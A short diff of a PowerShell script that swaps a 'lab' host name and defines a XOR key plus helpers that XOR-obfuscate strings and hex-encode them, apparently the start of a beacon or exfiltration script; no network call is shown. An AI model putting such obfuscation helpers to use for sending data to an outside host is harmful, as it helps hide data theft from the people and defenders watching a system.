@@ -1,4 +1,4 @@
-$Z="lab.quasarke.net"
+$Z="lab.mydomain.net"
 $K=[byte[]]@(96,38,118,3)
 function X($b){$o=New-Object byte[] $b.Length;for($i=0;$i-lt$b.Length;$i++){$o[$i]=$b[$i]-bxor$K[$i%4]};$o}
 function Enc($s){$b=X([text.encoding]::UTF8.GetBytes($s));-join($b|%{$_.ToString('x2')})}
